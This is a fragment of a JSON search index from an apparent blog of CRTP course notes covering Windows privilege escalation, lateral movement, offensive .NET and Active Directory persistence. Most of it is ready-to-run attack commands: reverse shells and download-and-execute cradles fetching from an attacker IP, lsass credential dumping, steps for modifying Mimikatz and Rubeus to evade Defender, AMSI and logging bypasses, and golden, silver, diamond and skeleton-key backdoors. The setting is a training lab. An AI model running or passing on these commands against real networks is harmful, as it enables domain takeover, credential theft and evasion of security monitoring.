        "teaser": "/assets/images/posts/crtp/crtp-teaser2.jpg"
      },{
        "title": "2 - Win Privesc",
        "excerpt":"  Win Privesc - Local      The material of CRTP about Local Privesc is not great    There are various ways of locally escalating privileges on Windows box:  – Missing patches – Automated deployment and AutoLogon passwords in clear text – AlwaysInstallElevated (Any user can run MSI as SYSTEM) – Misconfigured Services – DLL Hijacking and more – NTLM Relaying a.k.a. Won't Fix   We can use below tools for complete coverage:   PowerSploit - Privesc Module   Privesc on GitHub   winPEAS in PEASS-ng   Services Issues using PowerUp   Get services with unquoted paths and a space in their name:  Get-ServiceUnquoted -Verbose   Get services where the current user can write to its binary path or change arguments to the binary:  Get-ModifiableServiceFile -Verbose   Get the services whose configuration current user can modify:  Get-ModifiableService -Verbose   Run all checks with automated tools :  # PowerUp: Invoke-AllChecks  # Privesc: Invoke-PrivEsc  # PEASS-ng: winPEASx64.exe   Feature Abuse  - If you have Admin access (default installation before 2.x), go to http://&lt;jenkins_server&gt;/script - In the script console, Groovy scripts could be executed.   def sout = new StringBuffer(), serr = new StringBuffer() def proc = ' [INSERT COMMAND]'.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println \"out&gt; $sout err&gt; $serr\"   If you don’t have admin access but could add or edit build steps in the build configuration. Add a build step, add “Execute Windows Batch Command” and enter:  powershell -c &lt;command&gt;      Again, you could download and execute scripts, run encoded scripts and more.    Learning Objective 5:      Exploit a service and elevate privileges to local administrator.   Identify a machine in the domain where ur user has local administrative access.   Using privileges of a user on Jenkins get admin privileges on another server.   [easy to detect]  Invoke-ServiceAbuse -Name 'AbyssWebServer' -Username dcorp\\studentx -Verbose net localgroup Administrators   [easy to detect - noise]  Find-PSRemotingLocalAdminAccess   on Jenkins&gt; powershell iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcp.ps1); power -Reverse -IPAddress 172.16.100.1 -Port 443 on Attacker&gt; host the file in a webserver - example: HFS - HTTP File Server    disable firewall or add exception  on Attacker&gt; netcat-win32-1.12.exe -lvp 443   ","categories": ["notes","crtp"],
        "tags": ["begginer","AD","Windows"],
        "url": "/notes/crtp/winprivesc/",
        "teaser": "/assets/images/posts/crtp/crtp-teaser3.jpg"
      },{
        "title": "3 - Lateral Movement",
        "excerpt":"  Lateral Movement      Think of PowerShell Remoting (PSRemoting) as psexec on steroids but much more silent and super fast!   PSRemoting uses Windows Remote Management (WinRM) which is Microsoft’s implementation of WS-Management.   Enabled by default on Server 2012 onwards with a firewall exception.   Uses WinRM and listens by default on 5985 (HTTP) and 5986 (HTTPS).   It is the recommended way to manage Windows Core servers.   You may need to enable remoting (Enable-PSRemoting) on a Desktop Windows machine, Admin privs are required to do that.   The remoting process runs as a high integrity process. That is, you get an elevated shell.   One-to-One   PSSession:  – Interactive – Runs in a new process (wsmprovhost) – Is Stateful   Useful cmdlets:  – New-PSSession – Enter-PSSession   # 1. PS&gt;  Enter-PSSession &lt;machine&gt; Get-PSHostProcessInfo #this will show the ProccessID of wsmprovhost  # 2. PS&gt;  $machine = New-PSSession &lt;machine&gt;   One-to-Many      Also known as Fan-out remoting.   Non-interactive.   Executes commands parallely.   Useful cmdlets  – Invoke-Command   Run commands and scripts on:  – multiple remote computers – in disconnected sessions (v3) – as background job and more.      The best thing in PowerShell for passing the hashes, using credentials and executing commands on multiple remote computers. Use -Credential parameter to pass username/password.    [easy to detect - noisy]   Use below to execute commands or scriptblocks:  Invoke-Command -Scriptblock {Get-Process} -ComputerName\t(Get-Content &lt;list_of_servers&gt;)   Use below to execute scripts from files:  Invoke-Command -FilePath C:\\scripts\\Get-PassHashes.ps1 -\tComputerName (Get-Content &lt;list_of_servers&gt;)   Use below to execute locally loaded function on the remote machines:  Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content &lt;list_of_servers&gt;)   In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:  Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content &lt;list_of_servers&gt;) -ArgumentList   In below, a function call within the script is used:  Invoke-Command -Filepath C:\\scripts\\Get-PassHashes.ps1 -ComputerName (Get-Content &lt;list_of_servers&gt;)   Use below to execute Stateful commands using Invoke-Command:  $Sess = New-PSSession -Computername Server1 Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process} Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}   [more stealthy]      PowerShell remoting supports the system-wide transcripts and deep script block logging.    We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):  winrs -remote:server1 -u:server1\\administrator -p:Pass@1234 hostname      We can also use winrm.vbs  COM objects of WSMan object (even more silently)    WSMan-WinRM on GitHub   MIMIKATZ   Mimikatz on GitHub   Unofficial mimikatz guide:   ADSecurity Blog - Mimikatz DCSync Usage, Exploitation, and Detection   Local admin required      Invoke-Mimikatz, is a PowerShell port of Mimikatz. Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory.    All the functions of mimikatz could be used from this script.      [everything from LSASS is heavily detected]**    Dump credentials on a local machine using Mimikatz:  Invoke-Mimikatz -Command '\"sekurlsa::ekeys\"'   Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz):  SafetyKatz.exe \"sekurlsa::ekeys\"   Dump credentials Using SharpKatz (C# port of some of Mimikatzfunctionality):  SharpKatz.exe --Command ekeys   Dump credentials using Dumpert (Direct System Calls and API unhooking):  rundll32.exe C:\\Dumpert\\Outflank-Dumpert.dll,Dump   Using pypykatz (Mimikatz functionality in Python):  pypykatz.exe live lsa   Using comsvcs.dll:  tasklist /FI \"IMAGENAME eq lsass.exe\"  rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump &lt;lsass process ID&gt; C:\\Users\\Public\\lsass.dmp full      From a Linux attacking machine using impacket   From a Linux attacking machine using Physmem2profit   References   Fantastic Windows Logon Types and Where to Find Credentials in Them   Invoke-Mimikatz.ps1 in Nishang   SharpKatz on GitHub   Dumpert on GitHub   BetterSafetyKatz on GitHub   SafetyKatz on GitHub   pypykatz on GitHub   lsassy on GitHub   impacket on GitHub   physmem2profit on GitHub   What to do with credentials?   Over-Pass-The-Hash   Over Pass the hash (OPTH) generate tokens from hashes or keys.      Needs elevation (Run as administrator)    Invoke-Mimikatz -Command '\"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:&lt;aes256key&gt; /run:powershell.exe\"'  SafetyKatz.exe \"sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:&lt;aes256keys&gt; /run:cmd.exe\" \"exit\"      The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).       Over Pass the hash (OPTH) generate tokens from hashes or keys.   Doesn’t need elevation:  Rubeus.exe asktgt /user:administrator /rc4:&lt;ntlmhash&gt; /ptt   Needs elevation:  Rubeus.exe asktgt /user:administrator /aes256:&lt;aes256keys&gt; /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt   pass-the-hash # for non domain machines overpass-the-hash # for domain machines (it gerenates kerberos token)   DCSync      By default, Domain Admins privileges are required to run DCSync    To extract credentials from the DC without code execution on it, we can use DCSync.   To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:  Invoke-Mimikatz -Command '\"lsadump::dcsync /user:us\\krbtgt\"' SafetyKatz.exe \"lsadump::dcsync /user:us\\krbtgt\" \"exit\"  ","categories": ["notes","crtp"],
        "tags": ["begginer","AD","Windows","lateralmovement"],
        "url": "/notes/crtp/latmov/",
        "teaser": "/assets/images/posts/crtp/crtp-teaser4.jpg"
      },{
        "title": "4 - Offensive .NET",
        "excerpt":"  Offensive .NET   A repo of popular Offensive C# tools:   SharpCollection on GitHub   Mimikatz on GitHub   Tradecraft - AV bypass      We will focus mostly on bypass of signature based detection by Windows Defender    For that, we can use techniques like Obfuscation, String Manipulation etc.   We can use DefenderCheck:   DefenderCheck on GitHub      To identify code and strings from a binary that Windows Defender may flag.    This helps us in deciding on modifying the source code and minimal obfuscation.   SharpKatz   Let’s check SharpKatz.exe for signatures using DefenderCheck  DefenderCheck.exe &lt;Path to Sharpkatz binary&gt;      Open the project in Visual Studio.   Press CTRL + H   Find and replace the string “Credentials” with “Credents” you can use any other string as an replacement. (Make sure that string is not present in the code)   Select the scope as Entire Solution.   Press Replace All button.   Build and recheck the binary with DefenderCheck.   Repeat above steps if still there is detection   Safetykatz   For SafetyKatz, we used the following steps     Download latest version of Mimikatz and Out-CompressedDll.ps1   Run the Out-CompressedDll.ps1 PowerShell script on Mimikatz binary and save the output to a file  Out-CompressedDll &lt;Path to mimikatz.exe&gt; &gt; \toutputfilename.txt   Out-CompressedDll.ps1 in PowerSploit           Copy the value of the variable $EncodedCompressedFile from the output file above and replace the value of compressedMimikatzString variable in the Constants.cs file of SafetyKatz.       Copy the byte size from the output file and replace it in Program.cs file on the line 111 &amp; 116.   Build and recheck the binary with DefenderCheck   BetterSafetyKatz   For BetterSafetyKatz, we used the following steps     Download the latest release of “mimikatz_trunk.zip” file.   Convert the file to base64 value      Modify the Program.cs file.   – Added a new variable that contains the base64 value of mimikatz_trunk.zip file. – Comment the code that downloads or accepts the mimikatz file as an argument. – Convert the base64 string to bytes and pass it to zipStream variable      Rubeus   For Rubeus.exe, we used ConfuserEx to obfuscate the binary   ConfuserEx on GitHub   Launch ConfuserEx:     In Project tab select the Base Directory where the binary file is located.   In Project tab Select the Binary File that we want to obfuscate.   In Settings tab add the rules.   In Settings tab edit the rule and select the preset as Normal.   In Protect tab click on the protect button.      We will find the new obfuscated binary in the Confused folder under the Base Directory.          After obfuscating the binary with ConfuserEx rescan using DefenderCheck we can see the detection of GUID.   Generate and modify the GUID and compile Rubeus again and rerun the ConfuserEx on the Rubeus.exe binary.      Payload Delivery   We can use NetLoader to deliver our binary payloads.   NetLoader on GitHub   It can be used to load binary from filepath or URL and patch AMSI &amp; ETW while executing:  C:\\Users\\Public\\Loader.exe -path http://192.168.100.X/SafetyKatz.exe   We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL:  C:\\Users\\Public\\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe   [1] - Getting DA through dcorp-ci  iex (iwr http://&lt;ip&gt;/sbloggingbypass.txt -UseBasicParsing) # bypass ASMI manually iex ((New-Object Net.WebClient).DownloadString('http://&lt;ip&gt;/PowerView.ps1')) FInd-DomainUserLocation winrs -r:&lt;machine&gt; &lt;command&gt; //example winrs -r:dcorp-mgmt hostname;whoami iwr http://&lt;ip&gt;/Loader.exe -OutfFile C:\\Users\\Public\\Loader.exe echo F | xcopy C:\\Users\\Public\\Loader.exe \\\\dcorp-mgmt\\C$\\Users\\Public\\Loader.exe      [NOTE] Windows Defender will block all binaries/executables that are downloaded from remote sources So, we will configure a portforward to request payload from local loopback.       Even if Defender is watching this, because is not remotely the payload its not blocked    $null | winrs -r:dcorp-mgmt “netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=&lt;attacker IP&gt;” $null | winrs -r:dcorp-mgmt C:\\Users\\Public\\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit   Create a new PS with high integrity:  Rubeus.exe asktgt /user:svcadmin /aes256:&lt;dc hash&gt; /opsec /creanetonly:C:\\windows\\System32\\cmd.exe /show /ptt   [2] - Getting DA through derivative local admin   . C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1 Find-PSRemotingLocalAdminAccess -Verbose  Enter-PSSession &lt;the machine we have local admin access&gt;      we have to bypass AMSI here, but the shell is in ConstrainedLanguage Mode    $ExecutionContext.SessionState.LanguageMode      we need to search what kind o policy is blocking us : applocker, wdigest    Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections  or  reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\SRPV2 # \"AppLocker = Software Restrict Policy Version 2\"   Lets copy mimiEx to the target machine   From attacker:  Copy-Item C:\\AD\\Tools\\Invoke-MimiEx.ps1 \\\\dcorp-adminsrv.dollarcorp.moneycorp.local\\c$\\'Program Files'      Enter the machine again with PSSession and execute the MimiEx.ps1    From attacker:  C:\\AD\\Tools\\Loader.exe -Path C:\\AD\\Tools\\SafetyKatz.exe “sekurlsa::opassth” /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:&lt;hash&gt; /run:cmd.exe\" “exit”      This will open a shell with the hash we got with mimiEx   Firstly found what machines this user has local admin access      [EXTRA] Session: Service From 0 = means that there is a service using the account as a service account so, there is a chance of cached cleartext password on mimikatz results    In the new shell:  C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat . C:\\AD\\Tools\\Find-PSRemotingLocalAdminAccess.ps1 Find-PSRemotingLocalAdminAccess -Verbose      At this point, we can access dump the credentials like we did before in the last path Opening a portforward and dump through local loopback                                          ]    ","categories": ["notes","crtp"],
        "tags": ["begginer","AD","Windows","bypass"],
        "url": "/notes/crtp/offdotnet/",
        "teaser": "/assets/images/posts/crtp/crtp-teaser5.jpg"
      },{
        "title": "5 - AD Persistence",
        "excerpt":"  AD Persistence      DA is just the beggining We can add persistance, escalate to EA and attack across trusts!    Golden Ticket         Skips the 1 e 2 steps   its a signed and encrypted by the hash of krbtgt account which validates the TGT ticket   the krbtgt account can be used to impersonate any user with any privileges from even a non-domain machine      its recommended to change the password of the krbtgt account twice as password history is maintained for the account    How to do that   Execute mimikatz (or a variant) on DC as DA to get krbtgt hash:  Invoke-Mimikatz -Command '\"lsadump::lsa /patch\"' -Computername dcorp-dc   To use the DCSync feature for getting AES keys for krbtgt account.      Use the below command with DA privileges (or a user that has replication rights on the domain object):    C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:dcorp\\krbtgt\" \"exit\"      Using the DCSync option needs no code execution on the target DC    Run the below command to create a Golden ticket on any machine that has network connectivity with DC:  C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"            [obs] Always use an active domain admin to generate tickets preferable use /ptt and purge the ticket after use with klist purge    Learning Objective 8      Extract secrets from the domain controller of dollarcorp.   Using the secrets of krbtgt account, create a Golden ticket.   Use the Golden ticket to (once again) get domain admin privileges from a machine.   C:\\AD\\Tools\\Loader.exe -Path C:\\AD\\Tools\\SafetyKatz.exe “lsadump::dcsync /user:dcorp\\krbtgt” “exit”\t# [get the aes256 hash]  C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d91 4cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"  klist # it shows the cached tickets   Silver Ticket         A valid TGS (Golden ticket is TGT)   Encrypted and Signed by the hash of the service account      remember: Golden ticket is signed by hash of krbtgt       Services rarely check PAC (Privileged Attribute Certificate)   Services will allow access only to the services themselves   Reasonable persistence period (default 30 days for computer accounts)   Using hash of the Domain Controller computer account, below command provides access to file system on the DC:  C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"   Similar command can be used for any other service on a machine:      Which services? HOST, RPCSS, HTTP, WSMA and many more.             LAPS - control local admin credentials, does not control service accounts so, silver ticket will not be applied to laps       There are various ways of achieving command execution using Silver tickets   Create a silver ticket for the HOST SPN which will allow us to schedule a task on the target:  C:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt\" \"exit\"      This is Noisy    Schedule and execute a task:  schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU \"NT Authority\\SYSTEM\" /TN \"STCheck\" /TR \"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1:8080/Invoke-PowerShellTcp.ps1''')'\" schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN \"STCheck\"   Learning Objective 9   Try to get command execution on the domain controller by creating silver tickets for:      HOST service   WMI   Diamond Ticket      its created by decrypting a valid TGT, making changes to it and re-encrypt it using the AES keys of the krbtgt account   golden ticket was a TGT forging attacks whereas diamond ticket is a TGT modification attack   the persistence lifetime depends on krbtgt account   A diamond ticket is more opsec safe as it has:  → valid ticket times because a TGT issued by the DC is modified → in golden ticket, there is no corresponding TGT request for TGS/Service tickert requests as the TGT is forged   We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too):  Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt   We could also use /tgtdeleg option in place of credentials in case we have access as a domain user:  Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg \t/enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt   Learning Objective 10      Use Domain Admin privileges obtained earlier to execute the Diamond Ticket attack.   Skeleton Key      not recommended to do in an assessment Its not opsec safe and is also known to cause issues with AD CS       its a persistence technique where its possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password      not persistent across reboots    Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice.      DA privileges required    Invoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local      Now, it is possible to access any machine with a valid username and password as mimikatz:  Enter-PSSession -Computername dcorp-dc -credential dcorp\\Administrator   In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:  mimikatz # privilege::debug mimikatz # !+ mimikatz # !processprotect /process:lsass.exe /remove mimikatz # misc::skeleton mimikatz # !-      [NOTE] That above would be very noisy in logs - Service installation (Kernel mode driver)    You may like to modify the default key injected by Mimikatz!   Line 611 in kuhl_m_misc.c   For example, to use S3c3rtP@ss, compute its RC4 and split it into 8 bytes stubs:  56aa742a 6bebb9ca 62fc9f70 a2e00cd3      Reverse the values by 2 bytes   2a74aa56 cab9eb6b 709ffc62 d30ce0a2   Prepend 0x to each and modify kiwikey array value in the code linked above  DWORD kiwiKey[] = {0x2a74aa56, 0xcab9eb6b, 0x709ffc62, 0xd30ce0a2}   DSRM  Directory Services Restore Mode      There is a local admin is every DC called Administrator whose password is the DSRM password   DSRM password (SafeModePassword) is required when a server is promoted to DC and its rarely changed   After altering the configuration on the DC, its possible to pass the NTLM hash of this user to access the DC   Dump DSRM password:      needs DA privs    Invoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"' -Computername dcorp-dc   Compare the Administrator hash with the Administrator hash of below command:  Invoke-Mimikatz -Command '\"lsadump::lsa /patch\"' -Computername dcorp-dc      First one is the DSRM local Administrator       Since it is the local administrator of the DC, we can pass the hash to authenticate.   But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash:  Enter-PSSession -Computername dcorp-dc New-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD   Use below command to pass the hash:  Invoke-Mimikatz -Command '\"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe\"'  ls \\\\dcorp-dc\\C$   Learning Objective 11      Use Domain Admin privileges obtained earlier to abuse the DSRM credential for persistence.      OPSEC order: Silver &gt; Diamond &gt; Golden    Custom SSP   A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are:  – NTLM – Kerberos – Wdigest – CredSSP   Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.   We can use either of the ways:  # Drop the mimilib.dll to system32 and add mimilib to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages:  $packages = Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' $packages += \"mimilib\" Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name 'Security Packages' -Value $packages Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ -Name 'Security Packages' -Value $packages   Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable):  Invoke-Mimikatz -Command '\"misc::memssp\"'   All local logons on the DC are logged to:  C:\\Windows\\system32\\mimilsa.log   Persistence using ACLs - AdminSDHolder      Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups).   Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.            With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object.   In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.   How to do it   Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:  Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose   Using ActiveDirectory Module and RACE toolkit:   RACE on GitHub   Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose   Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder:  Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=loc\tal' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose  Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose   Run SDProp manually using Invoke-SDPropagator.ps1 from Tools directory:  Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose   For pre-Server 2008 machines:  Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose   Check the Domain Admins permission - PowerView as normal user:  Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match \"student1\"}   Using ActiveDirectory Module:  (Get-Acl -Path 'AD:\\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}   Abusing FullControl using PowerView:  Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose   Using ActiveDirectory Module:  Add-ADGroupMember -Identity 'Domain Admins' -Members testda   Abusing ResetPassword using PowerView:  Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString \"Password@123\" -AsPlainText -Force) -Verbose   Using ActiveDirectory Module:  Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString \"Password@123\" -AsPlainText -Force) -Verbose   Abusing ResetPassword using PowerView:  Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString \"Password@123\" -AsPlainText -Force) -Verbose   Using ActiveDirectory Module:  Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString \"Password@123\" -AsPlainText -Force) -Verbose   ACLs - Rights Abuse      With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run DCSync for any user.       Noisy - detect by MDI because an user other than dc is running dcsync    The permissions the user must have to execute DCSync:  - Replicating Directory Changes - Replicating Directory Changes All - Replicating Directory Changes in Filtered Set (in some cases)   DCsync:  C:\\AD\\Tools\\SafetyKatz.exe “lsadump::dcsync /user:dcorp\\krbtgt” “exit”   Add FullControl rights:  Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose   Using ActiveDirectory Module and RACE:  Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose   Add rights for DCSync:  Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose   Using ActiveDirectory Module and RACE:  Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -GUIDRight DCSync -Verbose   Execute DCSync:  Invoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'  or  C:\\AD\\Tools\\SafetyKatz.exe \"lsadump::dcsync /user:dcorp\\krbtgt\" \"exit\"   Learning Objective 12      Check if studentx has Replication (DCSync) rights.   If yes, execute the DCSync attack to pull hashes of the krbtgt user.   If no, add the replication rights for the studentx and execute the DCSync attack to pull hashes of the krbtgt user.   ACLs - Security Descriptors      It is possible to modify Security Descriptors (security information like Owner, primary group, DACL and SACL) of multiple remote access methods (securable objects) to allow access to non-admin users.   Administrative privileges are required for this.   It, of course, works as a very useful and impactful backdoor mechanism   Security Descriptor Definition Language defines the format which is used to describe a security descriptor. SDDL uses ACE strings for DACL and SACL:  ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid   ACE for built-in administrators for WMI namespaces:  A;CI;CCDCLCSWRPWPRCWD;;;SID   WMI   ACLs can be modified to allow non-admin users access to securable objects.   Using the RACE toolkit:  . C:\\AD\\Tools\\RACE-master\\RACE.ps1   On local machine for student1:  Set-RemoteWMI -SamAccountName student1 -Verbose   On remote machine for student1 without explicit credentials:  Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -namespace 'root\\cimv2' -Verbose   On remote machine with explicit credentials. Only root\\cimv2 and nested namespaces:  Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc -Credential Administrator -namespace 'root\\cimv2' -Verbose   On remote machine remove permissions:  Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\\cimv2' -Remove -Verbose   example of code execution with WMI:  Invoke-WmiMethod -Class win32_process -Name Create -ArgumentList ‘calc.exe’ -ComputerName dcorp-dc gwmi -Class win32_operatingsystem -ComputerName dcorp-dc   PowerShell Remoting      Using the RACE toolkit - PS Remoting backdoor not stable after August 2020 patches    On local machine for student1:  Set-RemotePSRemoting -SamAccountName student1 -Verbose   On remote machine for student1 without credentials:  Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Verbose   On remote machine, remove the permissions:  Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove   Remote Registry   Using RACE or DAMP, with admin privs on remote machine:  Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose   As student1, retrieve machine account hash:  Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose   Retrieve local account hash:  Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose   Retrieve domain cached credentials:  Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose   Learning Objective 13      Modify security descriptors on dcorp-dc to get access using PowerShell remoting and WMI without requiring administrator access.   Retrieve machine account hash from dcorp-dc without using administrator access and use that to execute a Silver Ticket attack to get code execution with WMI.   ","categories": ["notes","crtp"],
        "tags": ["begginer","AD","Windows","persistence"],
        "url": "/notes/crtp/domdom/",
        "teaser": "/assets/images/posts/crtp/crtp-teaser6.jpg"
      },{
        "title": "6 - AD Privesc",
